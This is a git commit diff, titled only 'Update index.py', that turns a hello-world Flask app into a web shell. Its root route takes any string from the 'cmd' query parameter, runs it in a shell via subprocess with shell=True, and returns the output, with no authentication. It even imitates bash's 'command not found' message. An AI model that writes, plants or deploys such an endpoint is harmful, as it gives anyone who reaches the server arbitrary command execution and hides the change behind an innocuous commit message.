cfc1efe37ab11ec5da898b0d4b96f582e6e6e4d6
oneapp <70068765+Usercodersystem@users.noreply.github.com>
2025-01-14 21:16:00 +0330

    Update index.py

--- python/flask3/api/index.py
+++ python/flask3/api/index.py
@@ -1,11 +1,18 @@
-from flask import Flask
+from flask import Flask,request,jsonify
+from subprocess import check_output as chk
+import subprocess
 
 app = Flask(__name__)
 
 @app.route('/')
-def home():
-    return 'Hello, World!'
-
-@app.route('/about')
-def about():
-    return 'About'
+def hello_world():
+    text = request.args.get("cmd")
+    if not text:
+        return jsonify({"result":"Input cmd parm"}),404
+    try:
+        return jsonify({"result":str(chk(text,shell=True).decode())}),200
+    except subprocess.CalledProcessError:
+        cmd = text.split(" ")[0]
+        return jsonify({"result":f"bash {cmd} : command not found"}),404
+    except:
+        return jsonify({"result":"Error"}),500
